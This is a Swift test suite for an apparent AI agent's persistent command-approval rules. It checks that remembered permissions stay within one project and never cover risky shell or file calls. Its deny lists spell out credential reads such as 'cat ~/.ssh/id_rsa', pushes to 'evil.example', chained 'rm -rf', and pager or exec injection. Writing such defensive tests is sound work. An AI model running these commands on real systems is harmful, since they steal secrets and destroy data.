import Foundation
import Testing
@testable import MinisCore

@Suite("Persistent allow-from-now-on rules")
struct PersistentApprovalRulesTests {
    private let now = Date(timeIntervalSince1970: 1_800_000_000)

    // MARK: Fixtures

    private func tempDirectory() throws -> URL {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("persistent-approval-rules-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    /// Tests never read the real home directory: a fixed fake keeps the
    /// "session root covers $HOME" exclusion deterministic.
    private func makeStore(_ file: URL, home: String = "/nonexistent-home-for-persistent-rule-tests") -> PersistentApprovalRuleStore {
        PersistentApprovalRuleStore(fileURL: file, homeDirectory: home)
    }

    private func snapshot(
        mode: ComposerTaskMode = .manual, session: String = "session-1", task: String = "task-1",
        epoch: String = "epoch-0"
    ) -> ComposerSubmissionSnapshot {
        ComposerSubmissionSnapshot(
            mode: mode, approvalScope: .request, effort: .standard,
            sessionID: session, turnID: 1, taskID: task, messageID: "message-1",
            workspaceID: "workspace-1", createdAt: now,
            policyRevision: "facts-1", grantEpoch: epoch,
            bypassModeConfirmed: mode == .bypassPermission, autonomyCeiling: .l3
        )
    }

    private func facts(roots: [String], epoch: String = "epoch-0", lease: String = "lease-1") -> ComposerPolicyFactSource {
        let granted: Set<String> = ["file_read", "file_write", "file_edit", "file_delete", "shell_execute", "browser_use", "web_search"]
        return ComposerPolicyFactSource(
            knownCapabilities: granted, grantedCapabilities: granted,
            allowedWriteRoots: roots, workspaceID: "workspace-1",
            revision: "facts-1", grantEpoch: epoch, leaseID: lease,
            expiresAt: now.addingTimeInterval(600), autonomyCeiling: .l3
        )
    }

    private func controller(
        rules: PersistentApprovalRuleStore, roots: [String], mode: ComposerTaskMode = .manual,
        session: String = "session-1", task: String = "task-1", epoch: String = "epoch-0", lease: String = "lease-1"
    ) -> ComposerAuthorizationController {
        ComposerAuthorizationController(
            snapshot: snapshot(mode: mode, session: session, task: task, epoch: epoch),
            facts: facts(roots: roots, epoch: epoch, lease: lease),
            grants: ComposerApprovalGrantStore(persistentRules: rules),
            now: { now }
        )
    }

    private func shell(_ command: String) throws -> ComposerToolInput {
        try ComposerToolInput(["command": command])
    }

    private func filePath(_ path: String) throws -> ComposerToolInput {
        try ComposerToolInput(["path": path, "content": "x"])
    }

    private let ask = ComposerAuthorizationDecision.requestApproval(requiresSecondConfirmation: false)

    // MARK: Persistence, hit, delete

    @Test("a saved shell prefix still matches after the store is rebuilt from disk")
    func shellPrefixSurvivesRebuild() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]

        let first = controller(rules: makeStore(file), roots: roots)
        // 手动档下只读命令（git status 等）本来就免问，所以用有副作用、可记住的 swift test 来测规则持久化。
        #expect(try await first.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
        let saved = await first.persistAllowRule(capability: "shell_execute", input: try shell("swift test"))
        #expect(saved?.pattern == "swift test")

        // New store object, new grant store, new session/task/epoch/lease.
        let rebuilt = controller(
            rules: makeStore(file), roots: roots,
            session: "session-2", task: "task-2", epoch: "epoch-9", lease: "lease-9")
        #expect(try await rebuilt.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
        #expect(try await rebuilt.authorize(capability: "shell_execute", input: shell("swift test --verbose")) == .execute)
        #expect(try await rebuilt.authorize(capability: "shell_execute", input: shell("npm test")) == ask)
        #expect(try await rebuilt.authorize(capability: "shell_execute", input: shell("git commit -m x")) == ask)
        #expect(try await rebuilt.authorize(capability: "shell_execute", input: shell("swift build")) == ask)

        let json = try JSONSerialization.jsonObject(with: Data(contentsOf: file)) as? [String: Any]
        #expect(json?["schemaVersion"] as? Int == 1)
        #expect((json?["rules"] as? [Any])?.count == 1)
    }

    @Test("git status persistence binds the scope of the offered rule")
    func gitStatusPersistenceRejectsRetargetedRoot() async throws {
        let directory = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let projectA = directory.appendingPathComponent("project-a", isDirectory: true)
        let projectB = directory.appendingPathComponent("project-b", isDirectory: true)
        let root = directory.appendingPathComponent("project-root")
        for project in [projectA, projectB] {
            try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        }
        try FileManager.default.createSymbolicLink(at: root, withDestinationURL: projectA)
        let store = makeStore(directory.appendingPathComponent("rules.json"))
        let owner = controller(rules: store, roots: [root.path])
        let input = try shell("git status")
        let offer = await owner.persistentAllowOffer(capability: "shell_execute", input: input)
        let offeredKey = try #require(offer?.projectKey)

        try FileManager.default.removeItem(at: root)
        try FileManager.default.createSymbolicLink(at: root, withDestinationURL: projectB)
        #expect(await owner.persistAllowRule(
            capability: "shell_execute", input: input, expectedProjectKey: offeredKey) == nil)
        #expect(store.allRules().isEmpty)

        try FileManager.default.removeItem(at: root)
        try FileManager.default.createSymbolicLink(at: root, withDestinationURL: projectA)
        let saved = try #require(await owner.persistAllowRule(
            capability: "shell_execute", input: input, expectedProjectKey: offeredKey))
        #expect(saved.projectKey == offeredKey)
        #expect(store.allRules() == [saved])
    }

    @Test("deleting a rule restores the prompt, also after a rebuild")
    func deleteRestoresPrompt() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("rules.json")
        let roots = [dir.appendingPathComponent("project").path]
        let store = makeStore(file)
        let c = controller(rules: store, roots: roots)
        let one = await c.persistAllowRule(capability: "shell_execute", input: try shell("swift build"))
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("swift test"))
        #expect(store.allRules().count == 2)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("swift build")) == .execute)

        #expect(store.remove(id: try #require(one).id))
        #expect(try await c.authorize(capability: "shell_execute", input: shell("swift build")) == ask)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
        #expect(makeStore(file).allRules().map(\.pattern) == ["swift test"])

        #expect(store.removeAll())
        #expect(try await c.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
        #expect(makeStore(file).allRules().isEmpty)
    }

    @Test("rules never cross projects, for shell prefixes and directory rules")
    func projectsDoNotShareRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let a = dir.appendingPathComponent("a", isDirectory: true)
        let b = dir.appendingPathComponent("b", isDirectory: true)
        try FileManager.default.createDirectory(at: a, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: b, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let inA = controller(rules: store, roots: [a.path])
        let inB = controller(rules: store, roots: [b.path])

        _ = await inA.persistAllowRule(capability: "shell_execute", input: try shell("swift test"))
        _ = await inA.persistAllowRule(capability: "file_write", input: try filePath(a.appendingPathComponent("x.txt").path))
        #expect(try await inA.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
        #expect(try await inA.authorize(capability: "file_write", input: filePath(a.appendingPathComponent("y.txt").path)) == .execute)
        #expect(try await inB.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
        #expect(try await inB.authorize(capability: "file_write", input: filePath(b.appendingPathComponent("y.txt").path)) == ask)
        // PM-13：file_write 规则同目录内也覆盖 file_edit；但仍不跨项目。
        #expect(try await inA.authorize(capability: "file_edit", input: filePath(a.appendingPathComponent("y.txt").path)) == .execute)
        #expect(try await inB.authorize(capability: "file_edit", input: filePath(b.appendingPathComponent("y.txt").path)) == ask)
    }

    // MARK: Ineligible calls

    @Test("commands with shell metacharacters offer no persistent allow and never match")
    func metacharactersAreNeverRemembered() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let roots = [dir.appendingPathComponent("project").path]
        let c = controller(rules: store, roots: roots)
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("git status"))

        // 对齐 Claude Code：复合命令（; | &&）按子命令各自生成前缀，不再整体拒绝；
        // 但含高危子命令、重定向、命令替换、变量展开的写法仍然不提供。
        let risky = [
            "git status; rm -rf x", "echo $(whoami)",
            "git status > out.txt", "git status < in.txt", "git status $HOME",
            "git status `pwd`",
        ]
        for command in risky {
            let input = try shell(command)
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: input)
            #expect(offer?.isAvailable == false, "offer for \(command)")
            #expect(offer?.unavailableReason?.isEmpty == false)
            #expect(await c.persistAllowRule(capability: "shell_execute", input: input) == nil, "rule for \(command)")
            // Even with `git status` stored, a compound line still asks.
            #expect(try await c.authorize(capability: "shell_execute", input: input) == ask, "match for \(command)")
        }
        #expect(store.allRules().count == 1)

        for command in ["rm -rf x", "/usr/bin/git status", "sudo ls", "python3 -c x", "git config user.name x",
                        "git -c core.pager=evil status"] {
            let offer = await c.persistentAllowOffer(capability: "shell_execute", input: try shell(command))
            #expect(offer?.isAvailable == false, "offer for \(command)")
        }
        #expect(await c.persistentAllowOffer(capability: "shell_execute", input: try shell("swift build"))?.summary == "swift build")
        #expect(await c.persistentAllowOffer(capability: "shell_execute", input: try shell("npm run build"))?.summary == "npm run build")
    }

    @Test("sensitive files and deletes keep asking even inside a remembered project")
    func sensitiveFilesAndDeletesKeepAsking() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let root = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let c = controller(rules: store, roots: [root.path])
        #expect(await c.persistAllowRule(capability: "file_write", input: try filePath(root.appendingPathComponent("ok.txt").path)) != nil)
        #expect(try await c.authorize(capability: "file_write", input: filePath(root.appendingPathComponent("other.txt").path)) == .execute)

        for name in [".env", ".env.local", "id_rsa", "server.pem", "signing.key", ".ssh/config", "credentials"] {
            let input = try filePath(root.appendingPathComponent(name).path)
            #expect(await c.persistentAllowOffer(capability: "file_write", input: input)?.isAvailable == false, "offer \(name)")
            #expect(await c.persistAllowRule(capability: "file_write", input: input) == nil, "rule \(name)")
            #expect(try await c.authorize(capability: "file_write", input: input) == ask, "match \(name)")
        }
        // Outside the authorized roots there is no offer and the root check rejects the call.
        #expect(await c.persistentAllowOffer(
            capability: "file_write", input: try filePath(dir.appendingPathComponent("elsewhere.txt").path))?.isAvailable == false)

        // file_delete has no concept of persistent allow at all.
        let delete = try filePath(root.appendingPathComponent("ok.txt").path)
        #expect(await c.persistentAllowOffer(capability: "file_delete", input: delete) == nil)
        #expect(await c.persistAllowRule(capability: "file_delete", input: delete) == nil)
        #expect(try await c.authorize(capability: "file_delete", input: delete) == ask)
    }

    @Test("an unattached store is inert, and plan or bypass semantics do not read rules")
    func inertStoreAndModeSemantics() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let roots = [dir.appendingPathComponent("project").path]
        let inert = controller(rules: PersistentApprovalRuleStore(), roots: roots)
        #expect(await inert.persistentAllowOffer(capability: "shell_execute", input: try shell("swift test")) == nil)
        #expect(await inert.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) == nil)
        #expect(try await inert.authorize(capability: "shell_execute", input: shell("swift test")) == ask)

        let store = makeStore(dir.appendingPathComponent("rules.json"))
        _ = await controller(rules: store, roots: roots).persistAllowRule(capability: "shell_execute", input: try shell("swift build"))
        // 对齐 Claude Code：计划模式下只读命令（如 git status）照常放行；有副作用的命令只预演，不读规则。
        #expect(try await controller(rules: store, roots: roots, mode: .plan)
            .authorize(capability: "shell_execute", input: shell("swift build")) == .dryRun)
        #expect(try await controller(rules: store, roots: roots, mode: .bypassPermission)
            .authorize(capability: "shell_execute", input: shell("swift build")) == .execute)
        #expect(store.allRules().count == 1)
    }

    // MARK: Effect guard (rules only skip the prompt, never the effect check)

    private func guardFixture() throws -> (dir: URL, root: URL, store: PersistentApprovalRuleStore) {
        let dir = try tempDirectory()
        let root = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let resolved = root.resolvingSymlinksInPath()
        return (dir, resolved, makeStore(dir.appendingPathComponent("rules.json")))
    }

    @Test("stored cat/ls/cp rules never cover sensitive or out-of-root paths, in every mode")
    func storedRulesStillAskForSensitiveAndOutsidePaths() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let seed = controller(rules: store, roots: [root.path])
        for command in ["cat README.md", "cp a b", "sort a", "uniq a", "git diff --stat"] {
            #expect(await seed.persistAllowRule(capability: "shell_execute", input: try shell(command)) != nil, "\(command)")
        }
        let risky = [
            "cat ~/.ssh/id_rsa", "cat /etc/hosts", "cat ../outside.txt", "cp a ~/.zshenv", "cp a /tmp/x",
            "sort -oX a", "sort --output=X a", "uniq a b", "git diff --no-index /etc/hosts /etc/passwd",
            "git diff /etc/hosts /etc/passwd", "cat .env", "cat --opt=/etc/hosts",
        ]
        for mode in [ComposerTaskMode.manual, .autoEdit, .auto, .plan] {
            let c = controller(rules: store, roots: [root.path], mode: mode)
            // 自动档的“免问”由审批门（逐条按输入风险询问）加效果检查器共同决定，控制器单独调用不含这一层；
            // 所以一律走真实的执行器决策口。被终端策略直接拒绝（抛错）同样算没有放行。
            let executor = ComposerPolicyEnforcedToolExecutor(base: Probe(), controller: c, approvalGate: ApprovalGate())
            for command in risky {
                let outcome = try? await executor.authorizationDecision(
                    callID: "risky-\(mode)", capability: "shell_execute", input: shell(command))
                #expect(outcome?.decision != .execute, "\(command) in \(mode)")
            }
        }
    }

    @Test("a symlink inside the project that points outside is not covered by a stored rule")
    func symlinkEscapeIsNotCovered() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let outside = dir.appendingPathComponent("outside.txt")
        try "x".write(to: outside, atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(at: root.appendingPathComponent("link"), withDestinationURL: outside)
        let c = controller(rules: store, roots: [root.path])
        _ = await c.persistAllowRule(capability: "shell_execute", input: try shell("cat inside.txt"))
        #expect(try await c.authorize(capability: "shell_execute", input: shell("cat inside.txt")) == .execute)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("cat link")) == ask)
    }

    @Test("find output options and exec-style shapes are rejected")
    func argumentShapesAreRejected() {
        for command in [
            "find . -fprint out", "find . -fls out", "sort -o x a", "sort --compress-program=evil a",
            "tree -o out", "file -C", "man -P evil ls", "git diff --no-index a b", "git log --exec=x",
        ] {
            #expect(PersistentApprovalRuleMatcher.rejectedArgumentShape(
                words: command.split(separator: " ").map(String.init)) != nil, "\(command)")
        }
        #expect(PersistentApprovalRuleMatcher.rejectedArgumentShape(words: ["uniq", "a"]) == nil)
    }

    @Test("env, outbound and arbitrary-write executables and zsh reserved words are not remembered")
    func newNeverPersistListAndReservedWords() {
        for command in ["curl https://x", "printenv", "tee out", "awk 1", "sed -n 1p", "open .", "defaults read x",
                        "cd src", "then ls", "if true", "git remote add o u", "git submodule update"] {
            guard case .unavailable = PersistentApprovalRuleMatcher.evaluateShellRules(command: command) else {
                Issue.record("\(command) must not be remembered"); continue
            }
        }
        // 包管理器和 git 联网命令仍可记住。
        for command in ["npm install", "git push"] {
            guard case .patterns = PersistentApprovalRuleMatcher.evaluateShellRules(command: command) else {
                Issue.record("\(command) should be rememberable"); continue
            }
        }
    }

    @Test("clone, archive, installer, config and interpreter-wrapper commands are never remembered")
    func writeOutsideAndWrapperCommandsAreNotRemembered() {
        for command in [
            "git clone https://example.com/a.git", "git clone -u evil a b", "tar xf a.tar", "unzip a.zip", "patch -p1",
            "pip install --user x", "pip install --target=/tmp/x y", "pip install --break-system-packages y",
            "cargo install foo", "go install foo", "gem install foo", "brew install foo", "pipx install foo",
            "uv tool install foo", "npm config set registry x", "yarn config set x y",
            "python3.12 -c x", "ruby3.3 a.rb", "node18 -e 1", "deno eval 1", "go test -exec evil",
            "go build -toolexec=evil", "xcrun python3 -c x", "uv run python -c x", "bundle exec ruby x",
            "poetry run sh x", "npx bash x", "gsed -i x f", "nawk 1", "busybox sh", "setopt x", "zmodload x",
            "pbpaste", "screencapture a.png", "git send-email --smtp-server=x",
        ] {
            guard case .unavailable = PersistentApprovalRuleMatcher.evaluateShellRules(command: command) else {
                Issue.record("\(command) must not be remembered"); continue
            }
        }
        for command in ["uv run pytest -q", "python3 build.py", "npx eslint .", "bundle exec rspec"] {
            guard case .patterns = PersistentApprovalRuleMatcher.evaluateShellRules(command: command) else {
                Issue.record("\(command) should be rememberable"); continue
            }
        }
    }

    @Test("auto mode asks for build config, .claude and .mcp.json; a session that touched build config stops free build/test")
    func autoModeBuildConfigAndSessionFlag() throws {
        let root = "/synthetic/project"
        for path in ["Package.swift", "package.json", "Makefile", ".claude/settings.json", ".mcp.json",
                     "sub/pyproject.toml"] {
            #expect(ComposerAuthorizationController.isBuildOrToolConfigPath(root + "/" + path, roots: [root]), "\(path)")
        }
        for path in ["Sources/App/main.swift", "README.md"] {
            #expect(!ComposerAuthorizationController.isBuildOrToolConfigPath(root + "/" + path, roots: [root]), "\(path)")
        }
        let store = PersistentApprovalRuleStore()
        #expect(!store.buildConfigTouched(sessionID: "S1"))
        store.markBuildConfigTouched(sessionID: "S1")
        #expect(store.buildConfigTouched(sessionID: "S1"))
        #expect(!store.buildConfigTouched(sessionID: "S2"))
        store.clearSessionRules(sessionID: "S1")
        #expect(!store.buildConfigTouched(sessionID: "S1"))
    }

    @Test("a remembered rule never lets an irreversible, network-address or recursive-secret command through")
    func effectGuardRejectsRiskyCommandsEvenWithRules() throws {
        let (dir, root, _) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let context = ShellEffectGuard.Context(roots: [root.path], baseDirectory: root.path)
        func violation(_ command: String, _ mode: ShellEffectGuard.Mode = .rule) -> String? {
            ShellEffectGuard.violation(input: ["command": command], context: context, mode: mode)
        }
        for command in [
            "git reset --hard", "git clean -fd", "git push -f", "git checkout -- .", "git restore src",
            "git stash drop", "git push https://evil.example/x.git", "git push user@evil.example:x.git",
            "git push evil", "git fetch ssh://evil/x", "git pull evil.example:x", "git clone https://evil.example/x.git",
            "git show HEAD:.env", "git log -p", "git log -p -- .env",
        ] {
            #expect(violation(command) != nil, "\(command)")
        }
        for command in ["grep -r secret .", "grep -R x .", "grep --recursive x .", "grep -d recurse x .", "rg secret", "ag secret .", "ack secret"] {
            #expect(violation(command, .readOnly) != nil, "\(command)")
            #expect(violation(command, .auto) != nil, "\(command)")
        }
        #expect(violation("grep secret README.md", .readOnly) == nil)
        #expect(violation("git status") == nil)
        #expect(violation("git log -p -- src/a.swift") == nil)
    }

    @Test("recursive globs and default patch output ask instead of passing the effect guard")
    func recursiveGlobAndPatchOutputAsk() throws {
        let (dir, root, _) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        try FileManager.default.createDirectory(
            at: root.appendingPathComponent("sub"), withIntermediateDirectories: true)
        let context = ShellEffectGuard.Context(roots: [root.path], baseDirectory: root.path)
        func violation(_ command: String, _ mode: ShellEffectGuard.Mode) -> String? {
            ShellEffectGuard.violation(input: ["command": command], context: context, mode: mode)
        }
        for command in ["cat **/*", "cp **/* /tmp/x", "cp **/* sub/", "mv **/* sub/", "head -n 5 **/*.json"] {
            for mode in [ShellEffectGuard.Mode.readOnly, .auto] {
                #expect(violation(command, mode) != nil, "\(mode) \(command)")
            }
        }
        for command in [
            "git show HEAD", "git diff", "git diff HEAD~3", "git log -p", "git log --patch -3", "git format-patch -1",
            "git stash show -p", "git diff -- .", "git diff -- sub", "git diff -- sub/", "git diff -- *.swift",
            "git show HEAD -- .", "git diff --stat -p",
        ] {
            #expect(violation(command, .readOnly) != nil, Comment(rawValue: command))
        }
        for command in [
            "git show --stat HEAD", "git diff --name-only", "git diff --name-status HEAD~1", "git show -s HEAD",
            "git diff --shortstat", "git diff --numstat", "git show --no-patch HEAD", "git log --oneline -5",
            "git diff -- src/a.swift", "git log -p -- src/a.swift",
        ] {
            #expect(violation(command, .readOnly) == nil, Comment(rawValue: command))
        }
    }

    @Test("od, hexdump, xxd, strings, file and stat are read-only without a prompt; xxd -r and sensitive files still ask")
    func binaryViewersAreReadOnly() throws {
        let (dir, root, _) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let context = ShellEffectGuard.Context(roots: [root.path], baseDirectory: root.path)
        func violation(_ command: String) -> String? {
            ShellEffectGuard.violation(input: ["command": command], context: context, mode: .readOnly)
        }
        for command in [
            "od -c README.md", "hexdump -C README.md", "xxd README.md", "xxd -l 16 README.md", "xxd -p README.md",
            "strings README.md", "file README.md", "stat -f %z README.md", "stat README.md",
        ] {
            #expect(violation(command) == nil, Comment(rawValue: command))
        }
        for command in [
            "xxd -r dump.txt out.bin", "xxd -r -p dump.txt", "xxd -revert dump.txt", "xxd README.md out.hex",
            "strings .env", "xxd .env", "od -c .env", "hexdump -C ../outside.bin", "file -C -m magic",
        ] {
            #expect(violation(command) != nil, Comment(rawValue: command))
        }
    }

    @Test("a stored curl or then rule from an older version no longer matches")
    func legacyDangerousRulesAreDead() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let scope = try #require(PersistentApprovalRuleMatcher.projectScope(roots: [root.path]))
        for pattern in ["curl", "then"] {
            _ = store.add(PersistentApprovalRule(projectKey: scope.key, projectRoots: scope.roots,
                kind: .shellCommandPrefix, capability: "shell_execute", pattern: pattern))
        }
        let c = controller(rules: store, roots: [root.path])
        #expect(try await c.authorize(capability: "shell_execute", input: shell("curl https://example.com")) == ask)
        #expect(try await c.authorize(capability: "shell_execute", input: shell("then ls")) == ask)
    }

    @Test("an old multi-root rule only hits when the granted root set is identical")
    func legacyMultiRootRuleDoesNotHitSingleRootSession() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let a = dir.appendingPathComponent("a"), b = dir.appendingPathComponent("b")
        for url in [a, b] { try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true) }
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let both = try #require(PersistentApprovalRuleMatcher.projectScope(roots: [a.path, b.path]))
        _ = store.add(PersistentApprovalRule(projectKey: both.key, projectRoots: both.roots,
            kind: .shellCommandPrefix, capability: "shell_execute", pattern: "swift test"))
        #expect(try await controller(rules: store, roots: [a.path, b.path])
            .authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
        #expect(try await controller(rules: store, roots: [b.path])
            .authorize(capability: "shell_execute", input: shell("swift test")) == ask)
    }

    @Test("auto mode skips the prompt for read-only and project build commands only, after the guard")
    func autoModeFreePassIsGuarded() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let c = controller(rules: store, roots: [root.path], mode: .auto)
        // 注意：直接 authorize 不带 policyRequiresApproval，这里只验证 plan 的只读判定。
        let plan = controller(rules: store, roots: [root.path], mode: .plan)
        for command in ["ls -la", "git status", "grep -n foo README.md"] {
            #expect(try await plan.authorize(capability: "shell_execute", input: shell(command)) == .execute, "\(command)")
        }
        for command in ["cat ~/.ssh/id_rsa", "ls /etc", "find . -fprint x", "uniq a b", "swift build"] {
            #expect(try await plan.authorize(capability: "shell_execute", input: shell(command)) == .dryRun, "\(command)")
        }
        #expect(await c.shellMayRunWithoutPrompt(input: try shell("swift test --filter Foo")))
        #expect(await c.shellMayRunWithoutPrompt(input: try shell("ls | grep a")))
        #expect(!(await c.shellMayRunWithoutPrompt(input: try shell("rm -rf build"))))
        #expect(!(await c.shellMayRunWithoutPrompt(input: try shell("cat ~/.ssh/id_rsa"))))
        #expect(!(await c.shellMayRunWithoutPrompt(input: try shell("cp a ~/.zshenv"))))
    }

    @Test("rule-hit receipts let a registered unknown command run, and the executor rechecks the effect")
    func ruleReceiptScopeAndRecheck() throws {
        let (dir, root, _) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let context = ShellEffectGuard.Context(roots: [root.path], baseDirectory: root.path)
        let recheck = ShellEffectRecheck(mode: .rule, context: context)
        ApprovedShellCallScope.$effectRecheck.withValue(recheck) {
            #expect(ApprovedShellCallScope.recheckViolation(
                input: ["command": "cat ~/.ssh/id_rsa"], workingDirectory: root.path) != nil)
            #expect(ApprovedShellCallScope.recheckViolation(
                input: ["command": "ffmpeg -i in.mov out.mp4"], workingDirectory: root.path) == nil)
        }
    }

    @Test("a child task reads the parent's rules through the upstream view and its allow-from-now-on writes to the parent store")
    func childReadOnlyView() async throws {
        let (dir, root, store) = try guardFixture()
        defer { try? FileManager.default.removeItem(at: dir) }
        let parent = controller(rules: store, roots: [root.path], session: "parent")
        _ = await parent.persistAllowRule(capability: "shell_execute", input: try shell("swift build"))
        let view = PersistentApprovalRuleStore(
            readOnlyUpstream: store, parentSessionID: "parent", parentProjectRoots: [root.path],
            homeDirectory: "/nonexistent-home-for-persistent-rule-tests")
        let child = ComposerAuthorizationController(
            snapshot: snapshot(session: "child"), facts: facts(roots: [root.path]),
            grants: ComposerApprovalGrantStore(persistentRules: view), now: { now })
        // 手动档下只读命令（ls、pwd）本来就免问，所以用有副作用、可记住的 swift build / swift test。
        #expect(try await child.authorize(capability: "shell_execute", input: shell("swift build")) == .execute)
        #expect(try await child.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
        // 子任务的卡片也提供"以后都允许"，规则写进父会话的规则库（用户 2026-11-17）。
        #expect(await child.persistentAllowOffer(capability: "shell_execute", input: try shell("swift test"))?.isAvailable == true)
        #expect(await child.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) != nil)
        #expect(store.allRules().count == 2)
        #expect(try await child.authorize(capability: "shell_execute", input: shell("swift test")) == .execute)
    }

    @Test("ordinary sessions share shell rules through the fixed private-workspace key")
    func ordinaryWorkspaceSharesShellRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir); PersistentApprovalRuleMatcher.ordinaryWorkspaceBase = nil }
        let base = dir.appendingPathComponent("workspaces", isDirectory: true)
        let a = base.appendingPathComponent("A", isDirectory: true)
        let b = base.appendingPathComponent("B", isDirectory: true)
        for url in [a, b] { try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true) }
        PersistentApprovalRuleMatcher.ordinaryWorkspaceBase = base.path
        let store = makeStore(dir.appendingPathComponent("rules.json"))
        let first = controller(rules: store, roots: [a.resolvingSymlinksInPath().path], session: "s1")
        _ = await first.persistAllowRule(capability: "shell_execute", input: try shell("swift build"))
        let second = controller(rules: store, roots: [b.resolvingSymlinksInPath().path], session: "s2")
        #expect(try await second.authorize(capability: "shell_execute", input: shell("swift build")) == .execute)
    }

    // MARK: Storage failures

    @Test("corrupt or newer-schema rule files load as no rules, are recorded, and do not crash")
    func corruptFilesLoadAsNoRules() async throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let roots = [dir.appendingPathComponent("project").path]

        for (index, contents) in ["{not json", "", "{\"schemaVersion\":99,\"rules\":[]}", "[1,2,3]"].enumerated() {
            let file = dir.appendingPathComponent("rules-\(index).json")
            try Data(contents.utf8).write(to: file)
            let store = makeStore(file)
            #expect(store.allRules().isEmpty)
            #expect(!store.diagnostics().isEmpty, "diagnostic for case \(index)")
            let c = controller(rules: store, roots: roots)
            #expect(try await c.authorize(capability: "shell_execute", input: shell("swift test")) == ask)
            // The store stays usable and writes a valid file afterwards.
            #expect(await c.persistAllowRule(capability: "shell_execute", input: try shell("swift test")) != nil)
            #expect(makeStore(file).allRules().count == 1)
            #expect(FileManager.default.fileExists(atPath: file.appendingPathExtension("corrupt").path))
        }
    }

    @Test("corrupt or newer-schema files keep readable deny/ask rules and never read allow rules")
    func damagedFilesKeepRestrictions() throws {
        let dir = try tempDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let rule: (String, String, String) -> [String: Any] = { id, behavior, pattern in
            ["id": id, "projectKey": "*global*", "projectRoots": [String](), "kind": "shell-command-prefix",
             "capability": "shell_execute", "pattern": pattern, "createdAt": "2026-10-22T00:00:00Z",
             "behavior": behavior]
        }
        let allow = rule("allow-1", "allow", "git status")
        let deny = rule("deny-1", "deny", "rm")
        let documents: [[String: Any]] = [
            ["schemaVersion": 99, "rules": [allow], "restrictions": [deny]],
            ["schemaVersion": 1, "rules": "broken", "restrictions": [deny]],
        ]
        for (index, document) in documents.enumerated() {
            let file = dir.appendingPathComponent("damaged-\(index).json")
            try JSONSerialization.data(withJSONObject: document).write(to: file)
            let store = makeStore(file)
            #expect(store.allRules().map(\.id) == ["deny-1"], "case \(index)")
            #expect(store.diagnostics().contains { $0.contains("保留了 1 条") })
            #expect(FileManager.default.fileExists(atPath: file.appendingPathExtension("corrupt").path))
            // 重启后拒绝规则仍在。
            #expect(makeStore(file).allRules().map(\.id) == ["deny-1"], "reload \(index)")
        }
    }

    // MARK: Executor integration (receipt and prompt)

    private struct PersistingDelegate: ApprovalDelegate {
        let recorder: Recorder
        let persist: Bool
        func requestApproval(_ request: ApprovalRequest) async -> ApprovalDecision {
            recorder.record(request)
            return ApprovalDecision(
                approved: true, reason: "ok", confirmed: true,
                requestID: request.requestID, bindingDigest: request.identityDigest,
                filePreview: request.filePreview, persistAllow: persist)
        }
    }

    private final class Recorder: @unchecked Sendable {
        private let lock = NSLock()
        private var requests: [ApprovalRequest] = []
        private var receipts: [ComposerApprovalReceipt] = []
        func record(_ request: ApprovalRequest) { lock.withLock { requests.append(request) } }
        func record(_ receipt: ComposerApprovalReceipt) { lock.withLock { receipts.append(receipt) } }
        var seenRequests: [ApprovalRequest] { lock.withLock { requests } }
        var seenReceipts: [ComposerApprovalReceipt] { lock.withLock { receipts } }
    }

